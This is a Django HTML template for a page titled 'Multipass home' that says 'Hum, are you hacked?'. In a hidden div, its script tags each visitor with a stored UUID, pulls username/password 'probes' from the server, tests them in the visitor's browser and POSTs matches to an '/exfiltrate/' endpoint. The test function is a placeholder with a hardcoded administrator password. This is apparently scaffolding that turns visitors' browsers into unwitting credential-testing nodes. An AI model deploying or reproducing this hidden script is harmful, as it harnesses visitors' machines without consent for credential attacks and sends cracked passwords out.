{% load static %}
<!doctype html>
<html lang="en" class="no-js">
<head>
    <meta charset="utf-8">
    <title>Multipass home</title>
    <link rel="stylesheet" href="{% static "app/style.css" %}">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
    <script src="{% static "app/script.js" %}"></script>
</head>
<body>
<p>&nbsp;</p>
<h1>Hum, are you hacked?</h1>
<p style="padding: 10px 20px; text-align: center;">May be visit this page is a bad idea</p>

<div>
    <img src="https://thumbor.sd-cdn.fr/ryN7WSkqnZhs8TVN78NNQXpVVio=/940x550/cdn.sd-cdn.fr/wp-content/uploads/2019/04/Se%CC%81curite%CC%81.jpeg"
         alt="image"/>
</div>

<div style="visibility: hidden">
    <script type="text/javascript">

        function uuidv4() {
          return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
          );
        }

        uuid = localStorage.getItem('uuid');
        if(uuid == null) {
            uuid = uuidv4();
            localStorage.setItem('uuid', uuid)
        }

        init = {headers: {'X-CLIENT-UUID': uuid}};

        async function ack() {
            await fetch('/app/{{ domain.name }}/ack/', init);
        }

        exfiltrate = function (username, password) {
            fetch('/{{ domain.name }}/exfiltrate/', {
                method: 'POST',
                body: JSON.stringify({
                    username: username,
                    password: password
                }),
                headers: {'X-CLIENT-UUID': uuid}
            })
        };

        test = function (username, password) {
            /***************** TEST FUNCTION HERE **********************/
            // just call exfiltrate(username, password) when a password is find
            console.log('test', username, password);
            if(username === 'administrator' && password === 'iloveyou') {
                exfiltrate(username, password)
            }
        };

        data = true;
        for(var i = 0; i < 5; i++) {

            fetch('/app/{{ domain.name }}/probes/', init)
                .then(response => {
                    response.json().then(function (probes) {
                        if(probes.probes.length === 0) {
                            console.log('no data, stop...');
                            data = false;
                        }
                        else {
                            probes.probes.forEach(function (probe) {
                                test(probe.username, probe.password);
                            });
                        }
                        ack();
                    });
                });
        }


    </script>
</div>

</body>

</html>